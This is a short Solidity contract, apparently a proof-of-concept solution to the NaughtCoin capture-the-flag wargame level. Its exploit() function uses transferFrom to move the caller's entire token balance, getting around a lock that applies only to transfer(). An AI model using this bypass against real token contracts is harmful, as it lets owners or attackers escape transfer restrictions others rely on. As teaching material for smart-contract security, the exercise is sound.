pragma solidity ^0.8.0;

import "./naughtcoin.sol";

contract NaughtCoinPoc {
    NaughtCoin naughtCoin;
    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    function exploit() public {
        naughtCoin.transferFrom(msg.sender, address(naughtCoin), naughtCoin.balanceOf(msg.sender));
    }
}